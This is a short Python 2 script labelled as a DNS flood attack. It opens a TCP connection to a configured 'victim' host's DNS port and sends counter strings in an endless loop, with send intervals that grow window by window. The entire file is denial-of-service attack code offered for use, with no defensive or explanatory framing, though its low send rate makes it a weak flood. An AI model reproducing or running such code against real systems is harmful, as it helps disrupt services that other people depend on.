"""
This script implements DNS flood attack.
"""

import socket
import time
from .. import configs

# GLOBALS
sent = 0


# ATTACK
def dns_flood():
    global sent
    duration = 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((configs.victim, configs.DNS_PORT))

    while True:
        # send packet
        sock.send("%s\n" % sent)

        # increment counter
        sent += 1

        # print log
        print "%s packets were sent to %s:%s. interval time: %s, send interval: %s" % (
            sent, configs.victim, configs.DNS_PORT, duration, configs.send_interval)

        # sleep for send_interval secs
        time.sleep(configs.send_interval)

        # increment duration
        duration += configs.send_interval

        # if window len wasn't over continue
        if duration < configs.window_length:
            continue

        # start new window and initial duration and send interval
        duration = 0
        configs.send_interval *= configs.interval_factor

    sock.close()


if __name__ == '__main__':
    dns_flood()
